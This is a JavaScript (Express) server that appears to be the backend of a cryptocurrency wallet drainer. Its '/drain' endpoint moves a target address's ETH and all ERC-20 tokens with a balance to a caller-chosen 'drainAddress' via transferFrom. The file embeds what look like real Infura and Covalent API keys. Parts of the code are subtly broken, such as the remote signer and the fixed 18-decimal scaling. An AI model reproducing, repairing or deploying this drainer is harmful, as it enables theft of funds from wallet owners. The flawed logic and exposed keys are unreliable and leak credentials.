const express = require('express');
const Web3 = require('web3');
const { ethers } = require("ethers");

const app = express();
const web3 = new Web3("https://mainnet.infura.io/v3/QN_801713e80c764d00a9cff03a4a888bf6");
const COVALENT_API_KEY = "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR"; // Replace with your own key or ckey_demo

app.use(express.json());

// Get all tokens (ETH and ERC-20) from the wallet
app.post('/drain-tokens', async (req, res) => {
  const { address } = req.body;

  // Fetch all tokens (ETH and ERC-20) from the wallet
  const ethBalance = await web3.eth.getBalance(address);

  // Get all token balances using Covalent API
  const tokens = await getERC20Tokens(address);

  res.json({
    eth: ethBalance,
    erc20: tokens
  });
});

// Fetch all ERC-20 tokens from the wallet using Covalent API
async function getERC20Tokens(address) {
  const response = await fetch(
    `https://api.covalenthq.com/v1/1/address/${address}/balances_v2/?key=${COVALENT_API_KEY}`
  );
  const data = await response.json();

  const items = data.data.items || [];

  const tokens = items
    .filter(t => t.contract_address && t.balance !== "0")
    .map(t => {
      const amount = Number(t.balance) / Math.pow(10, t.contract_decimals || 18);
      return {
        symbol: t.contract_ticker_symbol || "TOKEN",
        amount: amount,
        contractAddress: t.contract_address
      };
    });

  return tokens;
}

// Drain all tokens from the wallet
app.post('/drain', async (req, res) => {
  const { address, drainAddress } = req.body;

  // Get all tokens (ETH and ERC-20) from the wallet
  const ethBalance = await web3.eth.getBalance(address);

  const tokens = await getERC20Tokens(address);

  // Drain ETH
  const provider = new ethers.providers.JsonRpcProvider("https://mainnet.infura.io/v3/QN_801713e80c764d00a9cff03a4a888bf6");
  const signer = provider.getSigner();

  const tx = await signer.sendTransaction({
    to: drainAddress,
    value: ethBalance
  });

  console.log("ETH drained:", tx.hash);

  // Drain ERC-20 tokens
  for (const token of tokens) {
    const contract = new ethers.Contract(
      token.contractAddress,
      [
        "function transferFrom(address from, address to, uint256 amount) external"
      ],
      signer
    );

    const amount = token.amount;

    const tx = await contract.transferFrom(
      address,
      drainAddress,
      ethers.utils.parseUnits(amount.toString(), 18)
    );

    console.log(`Drained ${token.symbol}:`, tx.hash);
  }

  res.json({ message: "All tokens drained successfully!" });
});

app.listen(3000, () => {
  console.log("Backend running on port 3000");
});
